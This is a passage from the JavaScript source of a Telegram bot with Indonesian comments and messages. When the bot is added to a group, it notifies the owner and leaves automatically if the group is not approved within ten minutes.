  } catch {
    return ctx.answerCbQuery("❌ Error");
  }
});

//---------(DETEKSI BOT JOIN GB ) ---------//
bot.on("my_chat_member", async (ctx) => {
  try {
    const update = ctx.update.my_chat_member;
    const newStatus = update.new_chat_member.status;
    const oldStatus = update.old_chat_member.status;
    const chat = update.chat;

    const isGroup = chat.type === "group" || chat.type === "supergroup";
    if (!isGroup) return;

    const chatId = String(chat.id);
    const chatTitle = chat.title || "Tanpa Nama";

    // bot baru masuk / diundang ke group
    const joinedStatuses = ["member", "administrator"];
    const oldLeftStatuses = ["left", "kicked"];

    if (joinedStatuses.includes(newStatus) && oldLeftStatuses.includes(oldStatus)) {
      if (isGroupApproved(chatId)) return;

      await ctx.telegram.sendMessage(
        chat.id,
        "⚠️ Bot masuk ke group ini tapi belum di-approve owner.\n\nJika dalam 10 menit tidak di-approve, bot akan keluar otomatis."
      );

      // notif ke owner
      await ctx.telegram.sendMessage(
        ownerID,
        `🚨 BOT DITAMBAHKAN KE GROUP BARU\n\n` +
        `Nama Group: ${chatTitle}\n` +
        `Chat ID: ${chatId}\n\n` +
        `Gunakan:\n` +
        `/approved ${chatId}\n\n` +
        `Jika ingin mengizinkan bot aktif di group tersebut.`
      );

      // simpan pending + timer 10 menit
      if (pendingGroups.has(chatId)) {
        clearTimeout(pendingGroups.get(chatId).timeout);
      }

      const timeout = setTimeout(async () => {
        try {
          if (!isGroupApproved(chatId)) {
            await ctx.telegram.sendMessage(
              chat.id,
              "❌ Group tidak di-approve dalam 10 menit. Bot keluar otomatis."
            );
            await ctx.telegram.leaveChat(chat.id);
          }
        } catch (e) {
          console.error("Gagal leave group:", e.message);
        } finally {
          pendingGroups.delete(chatId);
        }
      }, 10 * 60 * 1000);

      pendingGroups.set(chatId, {
        title: chatTitle,
        timeout
      });
    }
  } catch (err) {
    console.error("Error my_chat_member:", err.message);
  }
});


bot.launch()